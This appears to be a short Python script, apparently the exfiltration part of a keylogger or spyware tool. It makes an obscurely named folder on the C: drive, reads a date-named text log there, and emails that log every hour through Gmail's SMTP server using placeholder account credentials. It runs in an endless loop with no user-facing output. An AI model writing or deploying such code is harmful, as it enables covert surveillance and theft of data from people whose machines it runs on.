import time, os, sys
import smtplib
from email.mime.text import MIMEText

dire = "C:/0089345aBCdEF/"
if not os.path.exists(dire):
    os.makedirs(dire)

date = dire
date += time.strftime("%d.%m.%Y") + ".txt" 

time.sleep(3600)

while True:
    with open(date) as fp:
        msg = MIMEText(fp.read())

    msg['Subject'] = 'The contents of %s' % date
    msg['From'] = "GMAIL ACCOUNT"
    msg['To'] = "GMAIL ACCOUNT MESSAGE IS SENT TO"
    
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("GMAIL ACCOUNT", "PASSWORD")
    s.send_message(msg)
    s.quit()
    time.sleep(3600)